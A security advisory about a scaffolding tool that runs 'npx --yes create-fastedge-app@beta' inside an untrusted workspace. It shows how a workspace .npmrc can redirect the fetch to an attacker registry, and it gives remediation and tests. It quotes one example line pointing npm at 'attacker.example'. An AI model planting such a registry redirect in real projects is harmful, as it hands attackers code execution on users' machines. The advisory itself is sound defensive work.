# SA-005 — Scaffolding fetches mutable packages with workspace-controlled npm config

**Severity:** Medium (raised from Low: the untrusted workspace can redirect the
registry, so this is not gated on compromising Gcore's npm account)
**Category:** Download of code without integrity check (CWE-494)
**Status:** Open
**Affected files:**
- `src/tools/local/scaffolding/scaffolds.ts:39` (`list-fastedge-templates`, `execAsync`)
- `src/tools/local/scaffolding/scaffolds.ts:158` (`scaffold-fastedge-project`, `execFile` args)

## Summary

Both scaffolding tools run `create-fastedge-app@beta` via `npx --yes`, which
fetches from the registry at tool-call time and executes what it gets. Two
distinct problems compound:

1. **Mutable dist-tag.** `@beta` is not a pin — it resolves to whatever the
   registry's `beta` tag currently points at (right now `0.0.14-beta.1`, which
   is *behind* `latest` = `0.0.16`). A moved or hijacked tag silently changes
   what code runs.
2. **The untrusted workspace controls npm's config.** Both invocations run with
   `cwd` inside the workspace (`execAsync` at :40 inherits the server cwd;
   `execFile` at :173 sets `cwd: options.workspaceRoot`). npm/npx read
   **project-level `.npmrc`** from the cwd and its ancestors — so a workspace
   containing `.npmrc` with `registry=https://attacker.example/` redirects the
   fetch to an attacker-controlled registry. **Version pinning alone does not
   fix this**: the attacker's registry can serve any payload under any version
   number. The `npm install` that scaffolding triggers inside the new project is
   subject to the same redirect.

Fetched code executes inside the container that holds the operator's API key
(SA-001) and, in the fallback case, as root (SA-004).

## Impact

- Supply-chain RCE: a malicious workspace `.npmrc` (e.g. in a cloned repo the
  user asked to work on) turns a scaffold/template-list call into arbitrary code
  execution — no compromise of Gcore infrastructure required. Hence Medium.
- Residual risk after fixing the redirect: mutable `@beta` still trusts the
  real registry's tag state.

## Remediation

Both parts are required:

1. **Neutralize workspace npm config for these invocations.** Point npm at an
   empty userconfig and force the registry explicitly:
   ```ts
   const NPM_SAFE_ENV = {
     npm_config_registry: "https://registry.npmjs.org/",
     NPM_CONFIG_USERCONFIG: "/dev/null",
     // project .npmrc has no dedicated kill-switch env var — ALSO run npx from a
     // cwd outside the workspace (e.g. os.tmpdir()) for the list-templates call,
     // and pass --registry explicitly where supported.
   };
   ```
   - `list-fastedge-templates` (`:39`): run with `cwd: os.tmpdir()` — it doesn't
     need the workspace at all — plus the env above.
   - `scaffold-fastedge-project` (`:173`): must create files in the workspace,
     so it keeps `cwd: options.workspaceRoot`; pass the env above so the
     registry/userconfig are forced even if a `.npmrc` sits in the workspace
     root. Verify with the test below — if project-level `.npmrc` still wins in
     your npm version, scaffold into a temp dir outside the workspace and move
     the result in afterwards.
2. **Pin an exact, verified version** — one shared constant, both call sites:
   ```ts
   // Deliberately version-bumped when the scaffolder updates. `latest` was
   // 0.0.16 at pin time; confirm before applying.
   const CREATE_APP_PKG = "create-fastedge-app@0.0.16";
   ```
   If pre-release testing needs `@beta`, gate it behind an explicit env flag
   (e.g. `SCAFFOLD_USE_BETA=1`), defaulting to the pin.
3. Longer term: ship `create-fastedge-app` into the image at build time (pinned
   + lockfiled in the Dockerfile) and invoke the local copy — removes the
   runtime registry fetch entirely. Note this does *not* cover the `npm install`
   the scaffolder runs inside the new project; that one inherently talks to the
   registry, which is why step 1's config-neutralization matters most.

## Test

Two checks in `scripts/tests/`:
- Grep guard: the scaffolding source contains an exact `create-fastedge-app@x.y.z`
  pin and no `@beta`/`@latest` (except behind the explicit flag).
- Redirect guard (integration, can be CI-only): put
  `registry=http://127.0.0.1:9/` in a temp workspace `.npmrc`, run
  `list-fastedge-templates`; it must still succeed (proving the workspace
  `.npmrc` was not honored).

## Related

- SA-001 (caps what leaked env the fetched code can read), SA-004 (what UID it
  runs as), SA-007 (timeouts already exist on these two call sites — keep them).
